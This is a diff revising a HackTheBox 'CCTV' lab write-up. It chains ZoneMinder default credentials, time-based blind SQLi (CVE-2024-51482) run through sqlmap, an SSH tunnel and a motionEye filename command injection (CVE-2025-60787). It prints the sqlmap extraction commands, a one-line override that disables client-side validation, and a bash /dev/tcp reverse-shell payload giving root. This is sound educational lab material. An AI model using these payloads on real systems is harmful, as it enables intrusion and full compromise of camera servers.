@@ -1,6 +1,14 @@
-# CCTV — Default creds → SQLi → motionEye RCE → root via Motion command injection
+![cctv](docs/cctv.png)
 
-**Tags:** `HackTheBox` `Linux` `Easy` `ZoneMinder` `SQLi` `CVE-2024-51482` `CVE-2025-60787` `SSH-tunneling` `command-injection` `Season-10`
+# CCTV
+
+Default credentials on an exposed ZoneMinder console lead to a blind SQL injection (CVE-2024-51482) that dumps a crackable user hash and yields SSH. Root comes from a localhost-bound motionEye instance reached over an SSH tunnel, where a filename field is passed unsanitised to a Motion daemon running as root (CVE-2025-60787).
+
+`linux` `web` `zoneminder` `sqli` `cve-2024-51482` `motioneye` `cve-2025-60787` `ssh-tunneling` `command-injection`
+
+---
+
+## Overview
 
 | Field          | Value                |
 | -------------- | -------------------- |
@@ -10,55 +18,47 @@
 | Release        | 2026-03-07           |
 | Starting Creds | None                 |
 
----
-
-## Attack Path
-
-```mermaid
-flowchart TD
-    A([10.129.1.237]):::start --> B[Port 80: ZoneMinder v1.37.63\nadmin:admin default creds]
-    B --> C[CVE-2024-51482\nBoolean SQLi — tid parameter]:::key
-    C --> D[Dump zm.Users\nmark bcrypt hash → crack → SSH]
-    D --> E([mark — foothold]):::user
-    E --> F[motionEye on 127.0.0.1:8765\nMotion daemon on 127.0.0.1:7999]
-    F --> G[SSH local port forward\nAccess motionEye UI]:::pivot
-    G --> H[CVE-2025-60787\nImage File Name injection → RCE]:::key
-    H --> I[Motion on_picture_save\nexecutes /tmp/s.sh as root]:::pivot
-    I --> J([user.txt/root.txt]):::root
-
-    classDef start fill:#4A90D9,color:#fff
-    classDef user fill:#27AE60,color:#fff
-    classDef root fill:#E74C3C,color:#fff
-    classDef key fill:#8E44AD,color:#fff
-    classDef pivot fill:#E67E22,color:#fff
-```
-
----
-
 ## TL;DR
 
-- Port 80 serves ZoneMinder v1.37.63, accessible with default `admin:admin`
-- CVE-2024-51482: time-based blind SQLi on `tid` parameter in ZoneMinder's event tag removal endpoint
-- Dump `zm.Users`, crack `mark`'s bcrypt hash, SSH in as `mark`
-- Two internal services bound to localhost: motionEye (8765) and Motion daemon (7999)
-- SSH local port forward to reach motionEye; authenticate as admin
-- CVE-2025-60787: inject reverse shell into motionEye's Image File Name field
-- Motion process runs with elevated privileges; `on_picture_save` executes `/tmp/s.sh` → root shell
+- Port 80 serves a CCTV landing page with ZoneMinder v1.37.63 at `/zm/`, accessible with default `admin:admin`
+- CVE-2024-51482: the `tid` parameter on ZoneMinder's event tag removal endpoint is concatenated into SQL unsanitised. Time-based blind injection dumps `zm.Users`
+- Crack `mark`'s bcrypt hash and SSH in
+- `ss -tlnp` shows two services bound to loopback: motionEye on `8765` and the Motion control API on `7999`. SSH local port forward reaches motionEye, whose admin password sits in plaintext in `/etc/motioneye/motion.conf`
+- CVE-2025-60787: the Image File Name field is passed to Motion's config without sanitisation. Motion runs as root, so the filename executes as root
 
----
+## Attack Chain
 
-## Setup
-
-```bash
-echo "10.129.1.237  cctv.htb" >> /etc/hosts
+```mermaid
+graph TD
+    A[nmap] --> B[ZoneMinder v1.37.63 - admin:admin]
+    B --> C[CVE-2024-51482 - blind SQLi on tid]
+    C --> D[Dump zm.Users - crack mark bcrypt]
+    D --> E[SSH as mark]
+    E --> F[ss -tlnp - motionEye 8765 localhost only]
+    F --> G[SSH local port forward]
+    G --> H[Plaintext admin password in motion.conf]
+    H --> I[CVE-2025-60787 - Image File Name injection]
+    I --> J[root]
 ```
 
----
+## Tools Used
 
-## Reconnaissance
+`nmap`, `curl`, `sqlmap`, `ssh`, `netcat`, browser devtools
+
+## Setup / Notes
 
 ```bash
-nmap -sCV -p- -T4 10.129.1.237 -oN cctv_full.txt
+echo "10.129.x.x cctv.htb" | sudo tee -a /etc/hosts
+```
+
+ZoneMinder session cookies expire quickly. Grab a fresh one immediately before any sqlmap run or every request 401s.
+
+---
+
+## Recon
+
+```bash
+nmap -sCV -p- -T4 10.129.x.x -oN cctv_full.txt
 ```
 
 ```
@@ -72,41 +72,69 @@ PORT   STATE SERVICE VERSION
 |_http-title: SecureVision CCTV & Security Solutions
 ```
 
-Two ports only. Port 80 is a CCTV-themed landing page with ZoneMinder at `/zm/`. The service title ("SecureVision CCTV & Security Solutions") is flavor — the real target is ZoneMinder.
+Two ports. The page title is flavour text; the real target is ZoneMinder at `/zm/`.
 
-Navigating to `http://cctv.htb/zm/` shows a ZoneMinder login page. Default credentials `admin:admin` work. The version is displayed in the top-right corner of the console: `v1.37.63`.
-
-![ZoneMinder console showing v1.37.63](docs/zoneminder-console.png)
-
-Version `1.37.63` is critical — it's past the CVE-2023-26035 patch boundary (1.37.33) but within the CVE-2024-51482 range (≤ 1.37.64).
+Only SSH and HTTP means the entire foothold has to come out of the web application, and any privesc is likely to involve something not visible from outside. Worth keeping in mind before spending time on the SSH banner.
 
 ---
 
 ## Enumeration
 
-### ZoneMinder — Default Credentials
+### ZoneMinder default credentials
+
+`http://cctv.htb/zm/` presents a ZoneMinder login. `admin:admin` works.
 
 ```bash
-# Test default creds via login endpoint
 curl -s -c cookies.txt -X POST "http://cctv.htb/zm/index.php" \
   -d "view=login&action=login&username=admin&password=admin" \
   -L -o /dev/null
-cat cookies.txt | grep ZMSESSID
+grep ZMSESSID cookies.txt
+```
+
+`-L` is required. ZoneMinder redirects on successful login, and stopping at the redirect hands back a session token for an unauthenticated session that looks valid.
+
+> The login form uses `username` and `password`, not `user` and `pass`. Wrong field names still return a cookie, just an unauthenticated one. Every downstream request then 401s and the failure reads like session expiry rather than a bad login.
+
+![ZoneMinder console showing v1.37.63](docs/zoneminder-console.png)
+
+The version sits in the top right of the console: `v1.37.63`. That number decides which advisory applies. It is past the CVE-2023-26035 patch boundary at 1.37.33, so unauthenticated RCE is off the table, but it falls inside the CVE-2024-51482 range at or below 1.37.64.
+
+### Internal services (post-foothold)
+
+Recorded here for continuity; discovered after SSH access as `mark`.
+
+```bash
+ss -tlnp
 ```
 
 ```
-#HttpOnly_cctv.htb  FALSE  /  FALSE  ...  ZMSESSID  <session_value>
+State   Recv-Q  Send-Q  Local Address:Port
+LISTEN  0       128     127.0.0.1:7999
+LISTEN  0       128     127.0.0.1:8765
+LISTEN  0       128     0.0.0.0:22
+LISTEN  0       128     0.0.0.0:80
 ```
 
-`admin:admin` works. The `-L` flag is required — ZoneMinder redirects on successful login, and stopping at the redirect gives an unauthenticated session token.
+- `127.0.0.1:8765` motionEye web frontend
+- `127.0.0.1:7999` Motion HTTP control API
 
-> ZoneMinder's login form uses `username` and `password`, not `user` and `pass`. Sending wrong field names returns a valid-looking cookie for an unauthenticated session — sqlmap will 401 on every request if this is wrong.
+Neither appeared in the external scan. Loopback binding is a deliberate exposure decision, and it means the service behind it was almost certainly written assuming only trusted local callers.
 
-### CVE-2024-51482 — Boolean SQLi via `tid`
+---
 
-The official advisory ([GHSA-qm8h-3xvf-m7j3](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)) identifies the vulnerable endpoint and parameter. In `web/ajax/event.php`, the `tid` value from `$_REQUEST` is concatenated directly into a SQL query with no sanitization.
+## Foothold → ZoneMinder blind SQLi (CVE-2024-51482)
 
-ZM session cookies expire quickly. Grab a fresh one immediately before running sqlmap to avoid 401s:
+### Why it's vulnerable
+
+The advisory ([GHSA-qm8h-3xvf-m7j3](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)) points at `web/ajax/event.php`, where the `tid` value is taken from `$_REQUEST` and concatenated straight into a SQL query with no parameterisation and no type coercion.
+
+Nothing about the endpoint is exotic. It is an authenticated AJAX handler for removing a tag from an event, which is exactly the kind of small internal route that tends to skip the framework's query builder because it only ever handles an integer. The default credentials are what make it reachable, so the two findings compound: neither is critical alone.
+
+The injection is blind. No query output is reflected in the response, so extraction has to come from a side channel, in this case response timing via `SLEEP()`.
+
+### Extraction
+
+Fresh session first:
 
 ```bash
 curl -s -c cookies.txt -X POST "http://cctv.htb/zm/index.php" \
@@ -116,7 +144,7 @@ SESS=$(grep ZMSESSID cookies.txt | awk '{print $NF}')
 echo "[*] Session: $SESS"
 ```
 
-First, enumerate all usernames in the database:
+Enumerate usernames before going after anything expensive:
 
 ```bash
 sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
@@ -134,7 +162,9 @@ sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=remove
 [*] retrieved: mark
 ```
 
-Two users: `admin` (which we already have) and `mark`. Target mark's password hash:
+`--technique=T` restricts sqlmap to time-based only. Boolean detection misfired against this query structure, and letting sqlmap try everything wastes requests on techniques that will not land. `--no-cast` avoids a CAST wrapper that breaks extraction here.
+
+Now target the one hash that matters:
 
 ```bash
 sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
@@ -156,23 +186,24 @@ Parameter: tid (GET)
 [*] retrieved: $2y$10$<redacted>
 ```
 
-`mark`'s bcrypt hash cracks to `[REDACTED — fill in on retirement]`. Use it to SSH in:
+A bcrypt hash over a time-based channel is roughly a second per character. Enumerating usernames first, then pulling exactly one hash, is the difference between minutes and hours.
+
+Crack the hash offline, then:
 
 ```bash
 ssh mark@cctv.htb
 ```
 
----
-
-## Exploitation
-
-### Foothold — mark
 ```
 mark@cctv:~$ id
 uid=1000(mark) gid=1000(mark) groups=1000(mark),24(cdrom),30(dip),46(plugdev)
 ```
 
-`mark` has no sudo, no docker group. `/home/sa_mark` is locked. Start enumerating what's available:
+---
+
+## Post-Exploitation
+
+`mark` has no sudo and no docker group.
 
 ```bash
 ls -la /opt/
@@ -184,45 +215,29 @@ drwxr-xr-x  3 root root 4096 Mar  2 09:49 video
 ```
 
 ```bash
-ls -la /opt/video/backups/
 cat /opt/video/backups/server.log
 ```
 
 ```
 Authorization as sa_mark successful. Command issued: disk-info. Outcome: success. 2026-03-07 19:33:04
 Authorization as sa_mark successful. Command issued: status. Outcome: success. 2026-03-07 19:35:05
-...
 ```
 
-`sa_mark` is authenticating to a service and issuing `disk-info` / `status` commands. The docker socket is present and writable by the `docker` group — but `mark` isn't in it, and there's no path to `sa_mark` from here. Dead end.
-```bash
-ss -tlnp
-```
+`sa_mark` authenticates to something and issues `disk-info` and `status`. No path from `mark` to `sa_mark` surfaced, and `/home/sa_mark` is not readable. Noted and set aside.
 
-```
-State   Recv-Q  Send-Q  Local Address:Port
-LISTEN  0       128     127.0.0.1:7999
-LISTEN  0       128     127.0.0.1:8765
-LISTEN  0       128     0.0.0.0:22
-LISTEN  0       128     0.0.0.0:80
-```
+### SSH tunnel to motionEye
 
-Two internal services:
-- `127.0.0.1:8765` — motionEye web frontend
-- `127.0.0.1:7999` — Motion HTTP control API
-
-### SSH Tunnel to motionEye
-
-motionEye is only listening on localhost — it can't be reached directly. SSH local port forwarding exposes it on the attack box:
+motionEye only listens on loopback, so it cannot be reached directly. A local port forward maps it onto the attack box:
 
 ```bash
-# Run on attack box, keep terminal open
 ssh -N -L 9765:127.0.0.1:8765 mark@cctv.htb
 ```
 
-Browse to `http://127.0.0.1:9765`. motionEye login page appears.
+`-N` opens no remote shell, since the connection exists only to carry the forward. The tunnel terminates on the target and connects to `127.0.0.1:8765` from the target's perspective, which is why a service bound to loopback is reachable at all.
 
-The motionEye config on the target stores credentials in plaintext:
+Browse to `http://127.0.0.1:9765`.
+
+### Plaintext credentials in config
 
 ```bash
 cat /etc/motioneye/motion.conf
@@ -235,106 +250,135 @@ cat /etc/motioneye/motion.conf
 # @normal_password
 ```
 
-Despite looking like a SHA1 hash, `989c5a8ee87a0e9521ec81a79187d162109282f0` is the literal plaintext password. motionEye stores it verbatim in the config file — no hashing. Log in with `admin` / `989c5a8ee87a0e9521ec81a79187d162109282f0`.
+The `@admin_password` value looks like a SHA1 digest and is not one. motionEye stores the password verbatim, so the 40 hex characters are the literal string to type into the login form.
 
 ![motionEye login page](docs/motioneye-login.png)
 
 ---
 
-## Privilege Escalation
+## Privilege Escalation → motionEye Image File Name RCE (CVE-2025-60787)
 
-### CVE-2025-60787 — motionEye Image File Name RCE
+### Why it works
 
-motionEye passes the Image File Name field to the Motion daemon config without sanitization. Shell metacharacters in the filename execute when Motion processes a snapshot ([GHSA-j945-qm58-4gjx](https://github.com/advisories/GHSA-j945-qm58-4gjx)).
+motionEye is a web frontend that writes configuration for the Motion daemon and restarts it. The Image File Name field becomes a filename template in Motion's config, and Motion expands that template through a shell when saving a snapshot ([GHSA-j945-qm58-4gjx](https://github.com/advisories/GHSA-j945-qm58-4gjx)). Shell metacharacters in the field are therefore executed, not stored.
 
-motionEye's UI performs client-side validation that rejects special characters. Bypass it via the browser console before applying the config.
+Two things turn that into root. First, the only validation on the field is client-side, running in the browser, on the attacker's machine. Second, Motion runs as root, so the injected command inherits root directly. There is no intermediate account and no second escalation step.
 
-![motionEye Still Images section with payload in Image File Name field](docs/motioneye-still-images.png)
+The pattern is worth naming: a value crosses from a configuration UI into a daemon's config file and then into a shell expansion, and the check that was supposed to stop it lives on the wrong side of the trust boundary.
 
-**Step 1:** On the attack box, open motionEye at `http://127.0.0.1:9765`. Open browser console (F12):
+### Steps
+
+**1.** With motionEye open at `http://127.0.0.1:9765`, disable the client-side validator from the browser console:
 
 ```javascript
 configUiValid = function() { return true; };
 ```
 
-This disables client-side field validation globally.
+Overriding the function globally means every field stops being validated, including the one the UI would otherwise reject.
 
-**Step 2:** In the camera settings panel → **Still Images**:
+**2.** In the camera settings panel, under **Still Images**:
+
 - **Capture mode:** `Interval Snapshots`
 - **Snapshot Interval:** `10`
 - **Image File Name:**
 
 ```
-$(bash -i >& /dev/tcp/10.10.14.x/4444 0>&1).%Y-%m-%d-%H-%M-%S
+$(bash -i >& /dev/tcp/10.10.x.x/4444 0>&1).%Y-%m-%d-%H-%M-%S
 ```
 
-**Step 3:** Start listener, then click **Apply**:
+The trailing timestamp pattern keeps the value looking like a filename template so the config still parses.
+
+![motionEye Still Images section with payload in Image File Name field](docs/motioneye-still-images.png)
+
+**3.** Start the listener, then click **Apply**:
 
 ```bash
 nc -lvnp 4444
 ```
 
-Motion restarts with the new config. When the first snapshot interval fires, the daemon executes the filename as a shell command.
+Motion restarts with the new config and fires on the first snapshot interval.
 
 ```
 Listening on 0.0.0.0 4444
-Connection received on 10.129.1.233 42230
+Connection received on 10.129.x.x 42230
 bash: cannot set terminal process group (8226): Inappropriate ioctl for device
 bash: no job control in this shell
 root@cctv:/etc/motioneye# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Motion runs as root. The shell lands in `/etc/motioneye` — the working directory of the Motion daemon. The filename injection executes directly in a root context.
+The shell lands in `/etc/motioneye`, the daemon's working directory.
 
 ```bash
 cat /home/sa_mark/user.txt
-```
-
-
-```bash
 cat /root/root.txt
 ```
 
-
 ---
 
-## Flags
+## Rabbit Holes
 
-| Flag     | Path                     | Host     | Value                   |
-| -------- | ------------------------ | -------- | ----------------------- |
-| user.txt | `/home/sa_mark/user.txt` | cctv.htb | [REDACTED — active box] |
-| root.txt | `/root/root.txt`         | cctv.htb | [REDACTED — active box] |
-
----
-
-## Tools
-
-| Tool     | Usage                                                                                              |
-| -------- | -------------------------------------------------------------------------------------------------- |
-| `nmap`   | Port scan and service fingerprinting                                                               |
-| `curl`   | ZoneMinder login, session cookie extraction, Motion API interaction                                |
-| `sqlmap` | Exploiting CVE-2024-51482 time-based blind SQLi on `tid` parameter to extract mark's password hash |
-| `ssh`    | Remote access as mark; SSH local port forwarding to expose internal services                       |
-| `nc`     | Reverse shell listener                                                                             |
+- **CVE-2023-26035** (ZoneMinder unauthenticated RCE). Patched at 1.37.33; the target runs 1.37.63. Checking the version against the patch boundary before writing an exploit saved the detour.
+- **`sa_mark` and `/opt/video/backups/server.log`.** A service account issuing commands to something, with no reachable authentication path from `mark`. Never used.
+- **Motion control API on `127.0.0.1:7999`.** Reachable through a second forward, not needed once the motionEye path landed.
 
 ---
 
 ## Lessons Learned
 
-- **Check form field names before scripting logins** — `username`/`password` vs `user`/`pass` produces a valid but unauthenticated session cookie. sqlmap 401s on every request and the error looks like a session expiry or wrong endpoint, not a login failure.
-- **Config files store credentials in unexpected formats** — motionEye's `@admin_password` field holds a plaintext string that happens to look like a SHA1 hash. Always try a value as a literal password before assuming it's a digest and wasting time cracking it.
-- **`--technique=T` forces time-only when other methods break the injection** — ZoneMinder's query structure caused boolean-based detection to misfire; specifying time-based exclusively with `--tamper=between` and `--no-cast` produced reliable results. Time-only against a bcrypt hash is slow — enumerate usernames first, then target only the hash of the account you need.
-- **Client-side input validation is always bypassable** — overriding a validation function in the browser console defeats it in one line. Any server-side payload that avoids special characters (a script path instead of an inline reverse shell) bypasses it entirely.
-- **Localhost-bound services require tunneling, not just access** — `ss -tlnp` should be a reflex on every foothold. Services on `127.0.0.1` are intentionally hidden from external access but fully reachable via SSH port forwarding.
-- **Daemon privilege level is a multiplier** — a command injection in a service running as root is an instant privilege escalation regardless of how simple the injection is. Always check what user a daemon runs as before assuming an injection gives limited access.
+- **Check form field names before scripting a login.** `username`/`password` against `user`/`pass` still returns a cookie, just an unauthenticated one. Everything downstream then 401s and the failure reads like session expiry rather than a bad login. Confirm the session is authenticated before blaming the exploit.
+- **Try a hash-looking string as a literal password first.** motionEye's `@admin_password` is 40 hex characters and is not a digest. Thirty seconds of trying it beats an hour of cracking something that was never hashed.
+- **Narrow sqlmap when the channel is slow.** `--technique=T` skips detection methods that misfire on the query structure, and `--no-cast` avoids a wrapper that breaks extraction. Pull usernames first, then one targeted hash. Time-based extraction of a full table is not a plan.
+- **Client-side validation lives on the attacker's machine.** One line in the console removes it. Any field validated only in the browser should be treated as unvalidated.
+- **`ss -tlnp` on every foothold.** Loopback-bound services are invisible to the external scan and are usually the ones written assuming a trusted caller. That assumption is what an SSH forward breaks.
+- **Check what user a daemon runs as before judging an injection.** The same filename injection against a service running as a low-privileged user would have been a lateral step. Against root it is the whole privesc.
+
+---
+
+## Commands Reference
+
+```bash
+# Setup
+echo "10.129.x.x cctv.htb" | sudo tee -a /etc/hosts
+
+# Recon
+nmap -sCV -p- -T4 10.129.x.x -oN cctv_full.txt
+
+# Session
+curl -s -c cookies.txt -X POST "http://cctv.htb/zm/index.php" \
+  -d "view=login&action=login&username=admin&password=admin" -L -o /dev/null
+SESS=$(grep ZMSESSID cookies.txt | awk '{print $NF}')
+
+# Foothold (CVE-2024-51482)
+sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
+  --cookie="ZMSESSID=$SESS" -p tid --dbms=MySQL --technique=T --time-sec=3 \
+  --sql-query="SELECT Username FROM zm.Users" --batch --no-cast --threads=3
+
+sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
+  --cookie="ZMSESSID=$SESS" -p tid --dbms=MySQL --technique=T --time-sec=3 \
+  --sql-query="SELECT Password FROM zm.Users WHERE Username='mark'" \
+  --batch --threads=3 --no-cast --tamper=between
+
+ssh mark@cctv.htb
+
+# Post-ex
+ss -tlnp
+cat /opt/video/backups/server.log
+cat /etc/motioneye/motion.conf
+ssh -N -L 9765:127.0.0.1:8765 mark@cctv.htb
+
+# Privesc (CVE-2025-60787)
+nc -lvnp 4444
+# Browser console: configUiValid = function() { return true; };
+# Image File Name: $(bash -i >& /dev/tcp/10.10.x.x/4444 0>&1).%Y-%m-%d-%H-%M-%S
+```
 
 ---
 
 ## References
 
-- [CVE-2024-51482 — ZoneMinder Boolean SQLi (GHSA-qm8h-3xvf-m7j3)](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)
+- [CVE-2024-51482, ZoneMinder blind SQLi (GHSA-qm8h-3xvf-m7j3)](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)
 - [BwithE/CVE-2024-51482 PoC](https://github.com/BwithE/CVE-2024-51482)
-- [CVE-2025-60787 — motionEye Image File Name RCE (GHSA-j945-qm58-4gjx)](https://github.com/advisories/GHSA-j945-qm58-4gjx)
+- [CVE-2025-60787, motionEye Image File Name RCE (GHSA-j945-qm58-4gjx)](https://github.com/advisories/GHSA-j945-qm58-4gjx)
 - [ZoneMinder GitHub](https://github.com/ZoneMinder/zoneminder)
 - [motionEye GitHub](https://github.com/motioneye-project/motioneye)
